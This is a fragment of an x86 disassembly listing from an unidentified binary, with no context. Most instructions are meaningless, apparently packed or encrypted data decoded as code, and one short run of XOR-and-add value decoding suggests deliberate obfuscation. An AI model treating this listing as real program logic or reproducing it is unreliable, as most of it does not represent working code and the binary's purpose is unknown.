  40a02a:	or     al,0xed
  40a02c:	pop    ebp
  40a02d:	pop    esp
  40a02e:	xor    BYTE PTR ds:0x5e7b372a,ch
  40a034:	jns    0x409fcf
  40a036:	test   BYTE PTR [edi-0x7c],cl
  40a039:	arpl   di,sp
  40a03b:	fistp  QWORD PTR [eax]
  40a03d:	cmp    dh,BYTE PTR [edi]
  40a03f:	jae    0x40a0aa
  40a041:	sub    eax,0x884a4e84
  40a046:	data16 jne 0x40a015
  40a049:	fmulp  st(0),st
  40a04b:	xlat   BYTE PTR ds:[ebx]
  40a04c:	pop    ds
  40a04d:	rcl    DWORD PTR [edi+eax*2-0x6d],cl
  40a051:	dec    esp
  40a052:	data16 ror BYTE PTR es:[ebx],0x8f
  40a057:	jbe    0x409fe7
  40a059:	xchg   ebx,eax
  40a05a:	rcl    DWORD PTR [ecx],1
  40a05c:	and    al,0x62
  40a05e:	stos   BYTE PTR es:[edi],al
  40a05f:	fnstsw WORD PTR [edx-0x4f]
  40a062:	push   es
  40a063:	jb     0x40a051
  40a065:	fs out dx,eax
  40a067:	test   BYTE PTR [eax-0x2f6b542e],0x3
  40a06e:	mov    dl,0xd5
  40a070:	in     eax,dx
  40a071:	scas   al,BYTE PTR es:[edi]
  40a072:	adc    al,0x87
  40a074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a075:	xchg   BYTE PTR [eax+ecx*8+0x75e8ae9],ch
  40a07c:	jmp    FWORD PTR [edi]
  40a07e:	pop    esp
  40a07f:	cmp    al,0x30
  40a081:	retf   
  40a082:	stos   DWORD PTR es:[edi],eax
  40a083:	xchg   BYTE PTR [ebx+ecx*2-0x3ef80e6c],al
  40a08a:	add    DWORD PTR [ebx],ecx
  40a08c:	push   esi
  40a08d:	and    BYTE PTR [edi+0xb],ah
  40a090:	stos   DWORD PTR es:[edi],eax
  40a091:	ja     0x40a074
  40a093:	scas   eax,DWORD PTR es:[edi]
  40a094:	loope  0x40a105
  40a096:	push   0x78ebb2c6
  40a09b:	xchg   DWORD PTR ds:0xf32fb5cb,eax
  40a0a1:	or     DWORD PTR [ebx],eax
  40a0a3:	test   BYTE PTR [edx+0x4d900e12],0x28
  40a0aa:	pop    edi
  40a0ab:	inc    eax
  40a0ac:	fwait
  40a0ad:	jmp    0xe001191c
  40a0b2:	dec    edx
  40a0b3:	imul   edx,DWORD PTR [ebp-0x3bbfd44e],0x16ff6ab0
  40a0bd:	ret    0x4624
  40a0c0:	jecxz  0x40a085
  40a0c2:	dec    eax
  40a0c3:	ret    
  40a0c4:	jnp    0x40a114
  40a0c6:	mov    ah,0x69
  40a0c8:	sbb    ecx,ebx
  40a0ca:	sbb    al,0xea
  40a0cc:	fwait
  40a0cd:	mov    bh,BYTE PTR [ebx]
  40a0cf:	and    dh,BYTE PTR [ebp-0x16956782]
  40a0d5:	sbb    BYTE PTR [ebx+0x51],0x7e
  40a0d9:	jmp    0x7c455511
  40a0de:	cwde   
  40a0df:	jle    0x40a0d3
  40a0e1:	neg    BYTE PTR [ebp-0x1e]
  40a0e4:	xchg   ebp,eax
  40a0e5:	ja     0x40a067
  40a0e7:	mov    ebp,0x118ce4af
  40a0ec:	in     eax,0xf5
  40a0ee:	imul   ebx,DWORD PTR [edi+ebp*4+0x3856c640],0xffffff8a
  40a0f6:	or     al,0x8d
  40a0f8:	pop    ebp
  40a0f9:	push   eax
  40a0fb:	call   0x8cc8:0x384b516e
  40a102:	jmp    0x40a168
  40a104:	fistp  QWORD PTR ds:0x10731c41
  40a10a:	ret    0x1fb9
  40a10d:	pop    ebp
  40a10e:	inc    ecx
  40a10f:	and    edi,DWORD PTR [esi-0x48]
  40a112:	jae    0x40a0bc
  40a114:	cli    
  40a115:	mov    esp,0x94cc3159
  40a11a:	pop    ss
  40a11b:	ins    DWORD PTR es:[edi],dx
  40a11c:	je     0x40a0f7
  40a11e:	dec    edx
  40a11f:	mov    ds:0x47258f7a,eax
  40a124:	icebp  
  40a125:	xchg   esi,eax
  40a126:	push   es
  40a127:	mov    bh,0x2f
  40a129:	inc    edx
  40a12a:	int3   
  40a12b:	ret    
  40a12c:	in     eax,dx
  40a12d:	push   ds
  40a12e:	mov    al,ah
  40a130:	sub    edi,ebp
  40a132:	aaa    
  40a133:	cmp    eax,0x565c678a
  40a138:	lods   eax,DWORD PTR ds:[esi]
  40a139:	xchg   BYTE PTR [esi+0x4a],cl
  40a13c:	int3   
  40a13d:	mov    esp,DWORD PTR [eax-0x61]
  40a140:	outs   dx,BYTE PTR ds:[esi]
  40a141:	aaa    
  40a142:	add    al,0xba
  40a144:	daa    
  40a145:	push   es
  40a146:	shl    DWORD PTR [ebx],1
  40a148:	xchg   BYTE PTR [ecx-0x710e4c03],bl
  40a14e:	or     bh,ah
  40a150:	adc    BYTE PTR [eax-0x428d4d56],cl
  40a156:	dec    esi
  40a157:	ins    DWORD PTR es:[edi],dx
  40a158:	xchg   esp,eax
  40a159:	xor    ch,al
  40a15b:	mov    al,0xe1
  40a15d:	mov    dh,0x14
  40a15f:	push   esi
  40a160:	push   esp
  40a161:	jne    0x40a141
  40a163:	dec    esi
  40a164:	scas   eax,DWORD PTR es:[edi]
  40a165:	mov    DWORD PTR [edx-0x2d],eax
  40a168:	(bad)  
  40a16b:	mov    dh,0xec
  40a16d:	xchg   edx,eax
  40a16e:	add    al,0xe5
  40a170:	cmp    esi,DWORD PTR [edx]
  40a172:	push   esp
  40a173:	adc    eax,0xf55ab1e0
  40a178:	inc    ecx
  40a179:	mov    cl,0x58
  40a17b:	xchg   BYTE PTR [edx],al
  40a17d:	pop    edi
  40a17e:	std    
  40a17f:	push   ds
  40a180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a181:	loop   0x40a11a
  40a183:	pusha  
  40a184:	cmp    DWORD PTR [ebp+eiz*4-0x85fcd72],edx
  40a18b:	cmp    bh,BYTE PTR [eax]
  40a18d:	pop    ecx
  40a18e:	std    
  40a18f:	mov    bh,0x7a
  40a191:	retf   
  40a192:	retf   0x246f
  40a195:	adc    al,0x57
  40a197:	ja     0x40a160
  40a199:	mov    DWORD PTR [esi],ebp
  40a19b:	push   es
  40a19c:	loop   0x40a1cf
  40a19e:	outs   dx,DWORD PTR ds:[esi]
  40a19f:	adc    dh,bh
  40a1a1:	cmp    ch,BYTE PTR [ebx+0x6d827762]
  40a1a7:	jmp    0x7997b370
  40a1ac:	jecxz  0x40a202
  40a1ae:	into   
  40a1af:	pop    es
  40a1b0:	xchg   BYTE PTR [edi],cl
  40a1b2:	outs   dx,BYTE PTR ds:[esi]
  40a1b3:	das    
  40a1b4:	mov    eax,0xad641b4c
  40a1b9:	iret   
  40a1ba:	mov    al,0xd2
  40a1bc:	adc    bl,dl
  40a1be:	push   edi
  40a1bf:	adc    BYTE PTR [eax],al
  40a1c1:	fisttp DWORD PTR [edi-0x2e]
  40a1c4:	mov    edi,eax
  40a1c6:	mov    al,ds:0xff6668e8
  40a1cb:	aaa    
  40a1cc:	sbb    edi,DWORD PTR [edi]
  40a1ce:	jmp    0x9c2aea0b
  40a1d3:	push   esi
  40a1d4:	jb     0x40a189
  40a1d6:	push   ds
  40a1d7:	iret   
  40a1d8:	cmp    DWORD PTR [ebp+esi*8-0x321808e4],0x31534b5e
  40a1e3:	sbb    eax,0x38eb56ea
  40a1e8:	scas   eax,DWORD PTR es:[edi]
  40a1e9:	or     eax,0x963e8b7
  40a1ee:	push   ebx
  40a1ef:	inc    esi
  40a1f0:	adc    al,0xb0
  40a1f2:	ja     0x40a1cb
  40a1f4:	add    ebx,DWORD PTR [ecx-0x5e]
  40a1f7:	ror    edi,0xaa
  40a1fa:	or     ebp,DWORD PTR [edx+ecx*4]
  40a1fd:	pop    edx
  40a1fe:	js     0x40a218
  40a200:	ror    BYTE PTR [ebx-0x317f4c5f],cl
  40a206:	ret    
  40a207:	sbb    DWORD PTR [eax+0x62],0xffffffa9
  40a20b:	and    dh,BYTE PTR [edx-0x1e]
  40a20e:	out    dx,eax
  40a20f:	inc    edx
  40a210:	pop    ss
  40a211:	call   0x4c63a42c
  40a216:	pop    ss
  40a217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a218:	retf   
  40a219:	(bad)  
  40a21a:	sub    eax,0x1a400dc8
  40a21f:	pop    ebp
  40a220:	not    BYTE PTR [esi-0x43700110]
  40a226:	xchg   DWORD PTR [ecx],ecx
  40a228:	sub    BYTE PTR [edx+eiz*2+0x7d963eb9],0x31
  40a230:	rcl    DWORD PTR [ecx-0x51d4a470],1
  40a236:	int3   
  40a237:	pop    ecx
  40a238:	sbb    edx,DWORD PTR [eax]
  40a23a:	xlat   BYTE PTR ds:[ebx]
  40a23b:	lahf   
  40a23c:	jno    0x40a1d0
  40a23e:	inc    eax
  40a23f:	add    al,0x11
  40a241:	sti    
  40a242:	int    0xe
  40a244:	and    eax,0x66616f72
  40a249:	xchg   ebp,eax
  40a24a:	aad    0xf0
  40a24c:	jb     0x40a243
  40a24e:	das    
  40a24f:	and    dl,BYTE PTR [ecx+0x4a2bfd4c]
  40a255:	adc    ebx,DWORD PTR [esi]
  40a257:	jno    0x40a22f
  40a259:	push   es
  40a25a:	jne    0x40a279
  40a25c:	xchg   esp,eax
  40a25d:	sub    al,0x6e
  40a25f:	sbb    ah,BYTE PTR [ecx-0x31]
  40a262:	out    0x4f,eax
  40a264:	adc    bh,BYTE PTR [eax+0x31]
  40a267:	dec    ecx
  40a268:	mov    esi,0xc54f3c6a
  40a26d:	xchg   ebp,eax
  40a26e:	mov    ds:0x600765c,al
  40a273:	stos   DWORD PTR es:[edi],eax
  40a274:	cs dec edi
  40a276:	enter  0xcacb,0x33
  40a27a:	adc    ch,al
  40a27c:	cli    
  40a27d:	cmc    
  40a27e:	xor    cl,BYTE PTR [ecx+0x1]
  40a281:	or     eax,0xacf3a7db
  40a286:	mov    eax,0x7caf2e4e
  40a28b:	pop    esp
  40a28c:	add    BYTE PTR [ecx-0x902614e],0x94
  40a293:	retf   0x6c27
  40a296:	test   al,0x14
  40a298:	cmp    eax,0xfed5b9be
  40a29d:	mov    ebx,0x9c553c4f
  40a2a2:	outs   dx,BYTE PTR ds:[esi]
  40a2a3:	push   esp
  40a2a4:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2a6:	lock call 0x4feb:0x828162b4
  40a2ae:	cld    
  40a2af:	imul   ecx,DWORD PTR [eax-0x6b],0xf092b2df
  40a2b6:	xor    eax,0xa2930664
  40a2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2bc:	pop    ds
  40a2bd:	(bad)  
  40a2be:	je     0x40a304
  40a2c0:	scas   al,BYTE PTR es:[edi]
  40a2c1:	mov    edi,0x7133cf97
  40a2c6:	pushf  
  40a2c7:	add    ecx,ebp
  40a2c9:	sub    al,0x98
  40a2cb:	les    ebp,FWORD PTR [edx+0x10]
  40a2ce:	sub    eax,edi
  40a2d0:	imul   BYTE PTR [eax+eax*1+0x4]
  40a2d4:	mov    ch,0x95
  40a2d6:	dec    esp
  40a2d7:	cmp    ebx,DWORD PTR [ebp+0x215425e1]
  40a2dd:	hlt    
  40a2de:	lock sub eax,0x2383d896
  40a2e4:	sbb    DWORD PTR [edx],eax
  40a2e6:	adc    ebp,DWORD PTR [ebp-0x76857b57]
  40a2ec:	mov    edx,0x1d2e7205
  40a2f1:	cmc    
  40a2f2:	je     0x40a2a9
  40a2f4:	pushf  
  40a2f5:	xchg   edx,eax
  40a2f6:	xchg   esi,eax
  40a2f7:	(bad)  
  40a2f8:	stos   BYTE PTR es:[edi],al
  40a2f9:	sbb    ah,BYTE PTR [edx-0x1b]
  40a2fc:	add    BYTE PTR [ebx],dl
  40a2fe:	xor    BYTE PTR [edx],al
  40a300:	xchg   ebp,eax
  40a301:	test   DWORD PTR [ebx],eax
  40a303:	xchg   edx,eax
  40a304:	sbb    eax,0xaf376460
  40a309:	mov    cl,0x78
  40a30b:	mov    ah,0xd
  40a30d:	pushf  
  40a30e:	jge    0x40a30b
  40a310:	arpl   WORD PTR [edi+eax*2-0x7e],si
  40a314:	outs   dx,DWORD PTR ds:[esi]
  40a315:	in     al,dx
  40a316:	pop    ebx
  40a317:	dec    edi
  40a318:	and    al,0x2b
  40a31a:	jecxz  0x40a2e0
  40a31c:	mov    ebp,DWORD PTR [edx+0x715cec15]
  40a322:	lahf   
  40a323:	inc    esp
  40a324:	jmp    0x433c:0x3a5d5115
  40a32b:	stos   BYTE PTR es:[edi],al
  40a32c:	xchg   esi,eax
  40a32d:	xlat   BYTE PTR ds:[ebx]
  40a32e:	mov    ch,0xac
  40a330:	and    ah,bh
  40a332:	sbb    WORD PTR [ecx+eiz*2],cx
  40a336:	call   0x7a84:0x5ec08d04
  40a33d:	pop    ebp
  40a33e:	add    bl,BYTE PTR [ebx]
  40a340:	retf   0x8334
  40a343:	sub    dh,BYTE PTR [ecx]
  40a345:	push   eax
  40a346:	ins    BYTE PTR es:[edi],dx
  40a347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a348:	push   ecx
  40a349:	pushf  
  40a34a:	dec    edi
  40a34b:	or     eax,0xd32692d0
  40a350:	pop    ebp
  40a351:	jbe    0x453ec159
  40a357:	mov    BYTE PTR [ebx+0x43],dh
  40a35a:	stos   DWORD PTR es:[edi],eax
  40a35b:	rcl    BYTE PTR [ecx-0x64],0x5f
  40a35f:	iret   
  40a360:	jmp    0x6458372e
  40a365:	ficom  DWORD PTR [edx]
  40a367:	das    
  40a368:	pop    ebx
  40a369:	into   
  40a36a:	jle    0x40a36a
  40a36c:	xor    al,0xda
  40a36e:	cwde   
  40a36f:	stos   BYTE PTR es:[edi],al
  40a370:	in     ax,dx
  40a372:	adc    ah,cl
  40a374:	es stos BYTE PTR es:[edi],al
  40a376:	adc    DWORD PTR [esi-0x151b16d3],edi
  40a37c:	push   0x49736aa4
  40a381:	mov    ds:0x4e2c7630,al
  40a386:	sbb    ch,ch
  40a388:	(bad)  [ebp+ebx*4-0x622012c4]
  40a38f:	pop    ecx
  40a390:	sbb    eax,0x23d24d10
  40a395:	shr    esp,1
  40a397:	and    ch,BYTE PTR [ecx]
  40a399:	mov    BYTE PTR [eax-0x6249eae3],dh
  40a39f:	xchg   ebx,eax
  40a3a0:	daa    
  40a3a1:	push   edx
  40a3a2:	mov    cl,0xb1
  40a3a4:	outs   dx,DWORD PTR ds:[esi]
  40a3a5:	aas    
  40a3a6:	cmp    al,0xb8
  40a3a8:	mov    esi,edi
  40a3aa:	ss retf 
  40a3ac:	jle    0x40a3c7
  40a3ae:	aas    
  40a3af:	mov    ah,0xf0
  40a3b1:	xchg   BYTE PTR [esi+0x4c4f569b],bh
  40a3b7:	mov    ds:0x6eb28cf5,al
  40a3bc:	jg     0x40a359
  40a3be:	dec    esp
  40a3bf:	pop    edx
  40a3c0:	lahf   
  40a3c1:	inc    esi
  40a3c2:	(bad)  
  40a3c4:	mov    bh,0x67
  40a3c6:	pusha  
  40a3c7:	test   eax,0x9247f548
  40a3cc:	xor    eax,0xc0e3365d
  40a3d1:	les    ecx,FWORD PTR [ebp+0x238477f7]
  40a3d7:	in     al,dx
  40a3d8:	test   BYTE PTR [ebp+0x40],ah
  40a3db:	or     al,0xa0
  40a3dd:	ret    0x1a31
  40a3e0:	ret    
  40a3e1:	dec    edi
  40a3e2:	arpl   WORD PTR [edx],si
  40a3e4:	inc    ecx
  40a3e5:	push   cs
  40a3e6:	dec    BYTE PTR [esi]
  40a3e8:	xchg   esi,eax
  40a3e9:	xor    al,0xd3
  40a3eb:	push   es
  40a3ec:	xchg   DWORD PTR [ebp+esi*1-0x21cce648],ecx
  40a3f3:	mov    ebp,0x9cf8e589
  40a3f8:	xchg   ecx,eax
  40a3f9:	push   esi
  40a3fa:	loop   0x40a3df
  40a3fc:	pop    ss
  40a3fd:	das    
  40a3fe:	jle    0x40a414
  40a400:	mov    eax,0x917535bf
  40a405:	jmp    DWORD PTR [esi-0x8]
  40a408:	mov    dl,ch
  40a40a:	outs   dx,BYTE PTR ds:[esi]
  40a40b:	jp     0x40a455
  40a40d:	stos   BYTE PTR es:[edi],al
  40a40e:	ror    DWORD PTR ds:0x4cc3797c,cl
  40a414:	push   ebp
  40a415:	repnz mov WORD PTR [esi],gs
  40a418:	xlat   BYTE PTR ds:[ebx]
  40a419:	jno    0x40a3e2
  40a41b:	icebp  
  40a41c:	(bad)  
  40a41f:	push   ebx
  40a420:	mov    BYTE PTR [edi+0x11],cl
  40a423:	sub    ch,ch
  40a425:	pop    es
  40a426:	inc    esi
  40a427:	add    eax,0x80aeb494
  40a42c:	rcr    BYTE PTR [ebx+0x25],cl
  40a42f:	cmp    dl,dl
  40a431:	push   eax
  40a432:	call   0x1b09:0xfb75cde7
  40a439:	loop   0x40a3c6
  40a43b:	leave  
  40a43c:	push   cs
  40a43d:	xchg   edx,eax
  40a43e:	in     al,0x95
  40a440:	xor    DWORD PTR [esi-0x33],0x28
  40a444:	ret    
  40a445:	cli    
  40a446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a447:	out    0x21,al
  40a449:	dec    edx
  40a44a:	cmp    eax,0xbb7f6c48
  40a44f:	mov    bl,0x6f
  40a451:	inc    esp
  40a452:	xor    eax,0xbf7dc707
  40a457:	and    ebp,ebp
  40a459:	lahf   
  40a45a:	das    
  40a45b:	and    eax,0x65220498
  40a460:	push   esp
  40a461:	pop    ds
  40a462:	arpl   bp,bx
  40a464:	sub    eax,0xcab04ca5
  40a469:	scas   eax,DWORD PTR es:[edi]
  40a46a:	and    ebx,ebp
  40a46c:	mov    esp,0xaa19119e
  40a471:	popf   
  40a472:	pop    ecx
  40a473:	mov    ds:0xa026777b,al
  40a478:	push   es
  40a479:	int    0x6d
  40a47b:	push   esp
  40a47c:	iret   
  40a47d:	mov    bh,0xd2
  40a47f:	pushf  
  40a480:	lahf   
  40a481:	push   ebp
  40a482:	ds ss xor al,0xd0
  40a486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a487:	pop    ss
  40a488:	sbb    al,0x61
  40a48a:	pop    es
  40a48b:	adc    edi,DWORD PTR [esi+0x510b7c07]
  40a491:	push   ebx
  40a492:	adc    DWORD PTR [eax-0x36],0x8be444db
  40a499:	test   al,0xb3
  40a49b:	mul    al
  40a49d:	leave  
  40a49e:	ins    DWORD PTR es:[edi],dx
  40a49f:	mov    cl,0x82
  40a4a1:	loope  0x40a4fe
  40a4a3:	(bad)  
  40a4a4:	sti    
  40a4a5:	mov    ds:0x7dd9dbdb,eax
  40a4aa:	int3   
  40a4ab:	xchg   al,dh
  40a4ad:	stos   BYTE PTR es:[edi],al
  40a4ae:	scas   eax,DWORD PTR es:[edi]
  40a4af:	mov    dh,0xdb
  40a4b1:	add    edi,0xe186a578
  40a4b7:	mov    dh,0x22
  40a4b9:	(bad)  [eax]
  40a4bb:	out    dx,al
  40a4bc:	adc    edx,DWORD PTR [eax-0x60]
  40a4bf:	icebp  
  40a4c0:	adc    BYTE PTR [ecx-0x2fd67b1a],ch
  40a4c6:	push   ebx
  40a4c7:	xor    eax,0x47b48c53
  40a4cc:	mov    esp,0x77a2f6b9
  40a4d1:	ja     0x40a4f1
  40a4d3:	xchg   edi,eax
  40a4d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4d5:	mov    eax,ds:0x90a98b1b
  40a4da:	fldl2t 
  40a4dc:	(bad)  
  40a4dd:	ss adc al,0xee
  40a4e0:	fidivr WORD PTR [edi]
  40a4e2:	pop    es
  40a4e3:	pop    ss
  40a4e4:	bound  ebx,QWORD PTR [ebp-0x741c6c34]
  40a4ea:	bound  esi,QWORD PTR [edi+0xbbfa048]
  40a4f0:	inc    eax
  40a4f1:	out    0x2,eax
  40a4f3:	inc    esi
  40a4f4:	jmp    0xa82d:0x265ac5f1
  40a4fb:	cdq    
  40a4fc:	xlat   BYTE PTR ds:[ebx]
  40a4fd:	je     0x40a4ce
  40a4ff:	fsubr  st(2),st
  40a501:	push   edx
  40a502:	cwde   
  40a503:	call   0xb99:0x3e76415a
  40a50a:	scas   al,BYTE PTR es:[edi]
  40a50b:	inc    ebp
  40a50c:	xor    ah,bh
  40a50e:	and    al,0x1d
  40a510:	jle    0x40a4fe
  40a512:	mov    ds:0xeb8c3b9,al
  40a517:	or     eax,DWORD PTR [ecx]
  40a519:	mov    BYTE PTR [ebx+0x3cc5dc4c],dl
  40a51f:	imul   edi,DWORD PTR [ebp+0x5425f0d7],0x74
  40a526:	aad    0xdf
  40a528:	out    0x7f,eax
  40a52a:	lods   al,BYTE PTR ds:[esi]
  40a52b:	xlat   BYTE PTR ds:[ebx]
  40a52c:	fstp   TBYTE PTR [ecx-0x69d9dcda]
  40a532:	pop    ds
  40a533:	jmp    0x40a565
  40a535:	gs cmp dl,dl
  40a538:	push   eax
  40a539:	rcl    DWORD PTR [edi+0x8],cl
  40a53c:	imul   eax,ebx,0x7d
  40a53f:	test   BYTE PTR [ebx-0x75d28d0],ah
  40a545:	fldcw  WORD PTR [ecx+ecx*4+0x4baa3248]
  40a54c:	in     eax,0x22
  40a54e:	cmp    edx,DWORD PTR [edi-0x296992c3]
  40a554:	sbb    al,0x91
  40a556:	mov    eax,ds:0x6aa231b8
  40a55b:	xor    bl,BYTE PTR [ecx]
  40a55d:	mov    esi,0xe5268a82
  40a562:	mov    ecx,0xc8de7148
  40a567:	mov    cl,0x98
  40a569:	sahf   
  40a56a:	push   0xc7a8a3db
  40a56f:	iret   
  40a570:	icebp  
  40a571:	fwait
  40a572:	xor    al,bh
  40a574:	sar    DWORD PTR ds:0x216b84e3,cl
  40a57a:	cmp    eax,0xdbb0e6e
  40a57f:	arpl   WORD PTR [ebp-0x1e42dbe1],ax
  40a585:	and    eax,esp
  40a587:	and    al,0xce
  40a589:	call   0xe468:0x656bd1c3
  40a590:	sbb    eax,0xeea8e853
  40a595:	aam    0xed
  40a597:	sub    al,0x6f
  40a599:	retf   0xc68f
  40a59c:	push   cs
  40a59d:	fwait
  40a59e:	mov    al,ds:0xfeb31106
  40a5a3:	jecxz  0x40a53f
  40a5a5:	test   al,0x45
  40a5a7:	(bad)  
  40a5a9:	ret    
  40a5aa:	cmp    al,0xac
  40a5ac:	aaa    
  40a5ad:	pop    es
  40a5ae:	popa   
  40a5af:	into   
  40a5b0:	jge    0x40a5cc
  40a5b2:	nop
  40a5b3:	pop    ecx
  40a5b4:	push   ss
  40a5b5:	cmp    ecx,DWORD PTR [esi]
  40a5b7:	mov    eax,ds:0xdd30ee57
  40a5bc:	stc    
  40a5bd:	loop   0x40a5c5
  40a5bf:	imul   ebx,DWORD PTR [edx+edx*8+0x76cb13e],0x78
  40a5c7:	xchg   ecx,eax
  40a5c8:	test   DWORD PTR [ecx+0x16],edx
  40a5cb:	mov    ebp,0x1f5c8d75
  40a5d0:	xchg   esp,eax
  40a5d1:	dec    esi
  40a5d2:	adc    esp,DWORD PTR [edx+0x784b44d2]
  40a5d8:	adc    DWORD PTR [esp+ecx*4],esp
  40a5db:	iret   
  40a5dc:	sbb    BYTE PTR [ebx],dl
  40a5de:	and    BYTE PTR [ebp+esi*2+0x7febd6f2],0x91
  40a5e6:	aad    0x3e
  40a5e8:	test   eax,0x3b2c8adb
  40a5ed:	push   0xffffffc6
  40a5ef:	jp     0x40a595
  40a5f1:	nop
  40a5f2:	int3   
  40a5f3:	and    al,0xf0
  40a5f5:	inc    edi
  40a5f6:	mov    dh,0x33
  40a5f8:	cdq    
  40a5f9:	jb     0x40a5f4
  40a5fb:	sub    BYTE PTR [edx],ch
  40a5fd:	cmp    bl,BYTE PTR [ebx+0x229d7f61]
  40a603:	mov    ah,0xb9
  40a605:	test   eax,0x85941a5
  40a60a:	mov    al,0xba
  40a60c:	in     eax,dx
  40a60d:	fidivr DWORD PTR [eax+0x7722915a]
  40a613:	mov    ch,0xa1
  40a615:	inc    esp
  40a616:	in     eax,0x7c
  40a618:	fdivr  DWORD PTR [edx-0x68]
  40a61b:	clc    
  40a61c:	push   0xffffffc6
  40a61e:	hlt    
  40a61f:	or     dh,BYTE PTR [eax+0x779fca28]
  40a625:	jg     0x40a66e
  40a627:	fsub   DWORD PTR [ebp-0xd9a3177]
  40a62d:	mov    esp,0x7755fbec
  40a632:	retf   0x78b5
  40a635:	aam    0x7e
  40a637:	jl     0x40a66b
  40a639:	dec    ebp
  40a63a:	mov    dh,0x89
  40a63c:	and    DWORD PTR [esi+esi*1],eax
  40a63f:	jbe    0x40a5d2
  40a641:	fs dec ebp
  40a643:	and    bh,bh
  40a645:	pop    edx
  40a646:	fcom   QWORD PTR [edx-0x1f0d0657]
  40a64c:	sbb    BYTE PTR [ebp-0x69881],0x1b
  40a653:	ja     0x40a665
  40a655:	mov    eax,0xa5c2d8cc
  40a65a:	push   ebx
  40a65b:	inc    edi
  40a65c:	mov    cl,0x8c
  40a65e:	jmp    0x9b9f8aa6
  40a663:	mov    al,0x54
  40a665:	sbb    al,0x41
  40a667:	js     0x40a653
  40a669:	jecxz  0x40a642
  40a66b:	sub    ecx,DWORD PTR [ecx]
  40a66d:	aas    
  40a66e:	add    BYTE PTR [edx+0x51],cl
  40a671:	in     al,0x70
  40a673:	lods   eax,DWORD PTR ds:[esi]
  40a674:	les    ebx,FWORD PTR [esi-0x75f6dddb]
  40a67a:	ins    BYTE PTR es:[edi],dx
  40a67b:	dec    edi
  40a67c:	aam    0x39
  40a67e:	(bad)  
  40a67f:	mov    edx,DWORD PTR [ebp-0x10]
  40a682:	mov    eax,DWORD PTR [ebp-0x14]
  40a685:	mov    ebx,DWORD PTR [ebp-0x2c]
  40a688:	sub    eax,edx
  40a68a:	xor    ebx,esi
  40a68c:	xor    edx,edx
  40a68e:	add    ebx,edi
  40a690:	div    ebx
  40a692:	mov    DWORD PTR [ebp-0x8],eax
  40a695:	mov    eax,DWORD PTR [ebp-0x44]
  40a698:	mov    edx,DWORD PTR [ebp-0x8]
  40a69b:	xor    eax,esi
  40a69d:	add    eax,edi
  40a69f:	cmp    edx,eax
  40a6a1:	jbe    0x40a6b1
  40a6a7:	mov    eax,DWORD PTR [ebp-0x44]
  40a6aa:	xor    eax,esi
  40a6ac:	add    eax,edi
  40a6ae:	mov    DWORD PTR [ebp-0x8],eax
  40a6b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40a6b4:	mov    edx,DWORD PTR [ebp-0x8]
  40a6b7:	xor    eax,esi
  40a6b9:	add    eax,edi
  40a6bb:	imul   eax,edx
  40a6be:	mov    DWORD PTR [ebp-0x8],eax
  40a6c1:	mov    eax,DWORD PTR [ebp-0x38]
  40a6c4:	mov    edx,DWORD PTR [ebp-0x8]
  40a6c7:	jmp    0x40ca23
  40a6cc:	pop    esi
  40a6cd:	inc    esi
  40a6ce:	mov    bl,BYTE PTR [edx+eax*4]
  40a6d1:	mov    al,al
  40a6d3:	clc    
  40a6d4:	jge    0x40a746
  40a6d6:	sub    edx,DWORD PTR [ebp+0x6779c268]
  40a6dc:	xchg   dh,dh
  40a6de:	jp     0x40a75a
  40a6e0:	cmp    ebx,DWORD PTR [edi+0x7a]
  40a6e3:	jp     0x40a67e
  40a6e5:	dec    BYTE PTR [edx+ebx*4+0x6c]
  40a6e9:	sub    BYTE PTR [eax],ch
  40a6eb:	es ror bl,cl
  40a6ee:	sub    BYTE PTR [ebx-0x76],ch
  40a6f1:	popa   
  40a6f2:	fdiv   QWORD PTR [ebx-0x18f5c019]
  40a6f8:	cs je  0x40a724
  40a6fb:	fld    st(6)
  40a6fd:	sbb    eax,0x70bfceb4
  40a702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a703:	xchg   esp,eax
  40a704:	jae    0x40a6ae
  40a706:	xchg   esp,eax
  40a707:	pusha  
  40a708:	mul    DWORD PTR [edi+esi*8+0x75]
  40a70c:	push   ds
  40a70d:	sbb    DWORD PTR [eax-0x6a],edx
  40a710:	dec    edi
  40a711:	dec    eax
  40a712:	adc    al,0x8a
  40a714:	in     al,0x84
  40a716:	arpl   sp,dx
  40a718:	mov    bh,0xc4
  40a71a:	fnstsw WORD PTR [ebx+0x5d5ecb1c]
  40a720:	dec    ecx
  40a721:	pop    esi
  40a722:	js     0x40a75e
  40a724:	je     0x40a770
  40a726:	shl    esi,0x5b
  40a729:	sub    edi,esp
  40a72b:	in     al,dx
  40a72c:	jecxz  0x40a6f2
  40a72e:	sar    DWORD PTR [ecx],1
  40a730:	neg    BYTE PTR [ecx+ecx*4-0x4f998ef2]
  40a737:	lahf   
  40a738:	out    dx,eax
  40a739:	jb     0x40a7a1
  40a73b:	jmp    0xcdcaeeed
  40a740:	sbb    eax,0x5796ed2e
  40a745:	outs   dx,DWORD PTR ds:[esi]
  40a746:	jbe    0x40a79d
  40a748:	and    ch,dh
  40a74a:	int    0x44
  40a74c:	inc    BYTE PTR ss:[edx+ecx*1-0x6944aaa0]
  40a754:	jne    0x40a726
  40a756:	push   ebx
  40a757:	out    0x26,eax
  40a759:	aaa    
  40a75a:	(bad)  
  40a75b:	sub    dh,BYTE PTR [esi+0x6a]
  40a75e:	enter  0xc3af,0xa2
  40a762:	call   0xaecd:0xfc7a49dc
  40a769:	mov    dh,0x12
  40a76b:	repz test BYTE PTR [ecx-0x33],ch
  40a76f:	in     eax,0x61
  40a771:	jge    0x40a7a0
  40a773:	mov    ecx,0x1ccb771c
  40a778:	cmp    al,0x4
  40a77a:	loop   0x40a774
  40a77c:	dec    edx
  40a77d:	sbb    BYTE PTR [ecx-0x5f06b864],ch
  40a783:	sahf   
  40a784:	int    0xb1
  40a786:	push   eax
  40a787:	out    0x8a,eax
  40a789:	stos   DWORD PTR es:[edi],eax
